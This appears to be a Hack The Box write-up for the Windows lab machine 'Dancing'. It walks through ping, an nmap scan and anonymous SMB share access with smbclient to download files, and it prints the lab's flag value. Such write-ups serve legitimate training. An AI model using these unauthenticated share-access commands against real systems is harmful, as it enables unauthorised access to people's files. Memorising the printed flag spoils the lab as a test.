# HTB — Dancing
<img width="1100" height="617" alt="image" src="https://github.com/user-attachments/assets/e85b159d-9539-4c44-9dd7-de1a5117fbcc" />

## Introduction

**Dancing** is an easy-level Windows machine on Hack The Box that demonstrates the risks associated with improperly configured SMB shares. The assessment begins with basic host discovery and service enumeration, followed by SMB share enumeration using `smbclient`. An accessible `WorkShares` share allows unauthenticated access, leading to the discovery and retrieval of the user flag. 

---

## 1. Initial Connectivity Test

I first verified connectivity to the target machine using `ping`:

```bash
ping 10.129.141.85
```

The host responded successfully to all three transmitted ICMP packets, with **0% packet loss**. This confirmed that the target was reachable before starting service enumeration. 

<img width="593" height="217" alt="image" src="https://github.com/user-attachments/assets/4ed8dba0-8885-4165-9a04-bd0b1567df10" />


---

## 2. Port and Service Enumeration

After confirming connectivity, I performed an Nmap scan with service and OS detection:

```bash
nmap -A 10.129.141.85
```

The scan identified several important services:

```text
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  http
```

Nmap identified the target as a **Microsoft Windows Server 2019** system. The presence of ports **139/tcp and 445/tcp** indicated that SMB was available, making SMB enumeration the next logical step. 

The relevant attack surface was therefore:

```text
135/tcp  → MSRPC
139/tcp  → NetBIOS / SMB
445/tcp  → SMB
5985/tcp → HTTP / WinRM
```

Since SMB was exposed, I focused the enumeration on available SMB shares.

<img width="721" height="560" alt="image" src="https://github.com/user-attachments/assets/1a1cdb99-e9dc-4034-a020-1719dc01a095" />


---

## 3. Enumerating SMB Shares

I used `smbclient` to enumerate the available shares without providing credentials:

```bash
smbclient -L //10.129.141.85 -N
```

The `-N` option tells `smbclient` not to request a password.

The server returned several shares:

```text
ADMIN$      Disk      Remote Admin
C$          Disk      Default share
IPC$        IPC       Remote IPC
WorkShares  Disk
```

The important discovery was the **WorkShares** share, which was accessible during unauthenticated share enumeration. 

<img width="652" height="209" alt="image" src="https://github.com/user-attachments/assets/84926274-6d69-4cdf-b060-394a23264265" />


---

## 4. Connecting to the WorkShares Share

I then connected directly to the `WorkShares` share:

```bash
smbclient //10.129.141.85/WorkShares -N
```

The connection was successful and provided an interactive SMB shell:

```text
smb: \>
```

This confirmed that the share could be accessed without supplying a username or password. 

<img width="407" height="102" alt="image" src="https://github.com/user-attachments/assets/27ce3cd5-fe94-4804-a097-af2b01835221" />


---

## 5. Enumerating the Share

Inside the SMB session, I listed the contents of the share:

```text
smb: \> ls
```

Two directories were available:

```text
Amy.J
James.P
```

I first entered the `Amy.J` directory:

```text
smb: \> cd Amy.J
smb: \Amy.J\> ls
```

This directory contained:

```text
worknotes.txt
```

I downloaded the file with:

```text
smb: \Amy.J\> get worknotes.txt
```

The file contained the following notes:

```text
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

The notes provide some information about services configured or intended to be configured on the machine, including WinRM. 

---

## 6. Enumerating James.P

I then returned to the share root and inspected the second directory:

```text
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
```

The directory contained:

```text
flag.txt
```

I downloaded the file using:

```text
smb: \James.P\> get flag.txt
```

The file was successfully transferred to my local machine. 

<img width="778" height="473" alt="image" src="https://github.com/user-attachments/assets/9d06bc25-51cb-4ee5-9f49-30ebb9da0741" />


---

## 7. Retrieving the Flag

After leaving the SMB session, I confirmed that both downloaded files were present locally:

```bash
ls
```

The output showed:

```text
flag.txt
worknotes.txt
```

I then read the contents of the flag:

```bash
cat flag.txt
```

The target flag was:

```text
5f61c10dffbc77a704d76016a22f1664
```

This completed the machine. 

<img width="350" height="237" alt="image" src="https://github.com/user-attachments/assets/c8207a08-4859-48b8-b081-837e8714eb1e" />


---

## Attack Path

The complete attack path can be summarized as:

```text
Target Discovery
      │
      ▼
Ping 10.129.141.85
      │
      ▼
Nmap Enumeration
      │
      ▼
SMB discovered on 139/445
      │
      ▼
Enumerate SMB Shares
      │
      ▼
WorkShares discovered
      │
      ▼
Unauthenticated SMB Access (-N)
      │
      ▼
Enumerate Amy.J / James.P
      │
      ▼
Download flag.txt
      │
      ▼
Read Flag
```

## Conclusion

The compromise of **Dancing** was primarily enabled by an improperly configured SMB share. The `WorkShares` share was accessible without authentication, allowing an unauthenticated user to browse directories and download files.

From a defensive perspective, SMB shares should be protected with appropriate authentication and authorization controls. Anonymous or guest access should be disabled unless explicitly required, and access permissions should follow the principle of least privilege. Sensitive files should also not be stored in publicly accessible network shares.

**Key techniques demonstrated:**

* Host connectivity testing with `ping`
* Network and service enumeration with Nmap
* SMB share enumeration with `smbclient`
* Unauthenticated SMB access
* SMB directory enumeration
* Remote file retrieval with `get`
* Local flag extraction

**Tools Used:** `ping` · `Nmap` · `smbclient` · Linux CLI
